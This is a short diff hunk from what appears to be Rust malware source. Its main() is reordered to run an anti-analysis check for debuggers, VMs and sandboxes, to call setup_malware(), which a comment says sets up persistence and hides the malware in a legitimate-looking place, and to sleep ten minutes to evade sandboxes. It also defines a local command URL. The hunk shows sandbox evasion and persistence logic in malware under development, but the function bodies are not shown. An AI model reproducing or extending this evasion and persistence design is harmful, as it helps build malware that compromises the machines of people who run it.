@@ -47,10 +47,14 @@ macro_rules! dead_branches {
 #[tokio::main]
 async fn main() {
 
-    //anti sandbox
-    sleep(Duration::from_secs(600)).await;
-    setup_malware();
+    //checks if debugger, vm, sandbox is being used
     check_for_analysis_behaviour();
+
+    //tries to setup persistency and put malware somewhere legit
+    setup_malware();
+
+    sleep(Duration::from_secs(600)).await;
+
 
     const URL: &'static str = "http://127.0.0.1:5000";
 
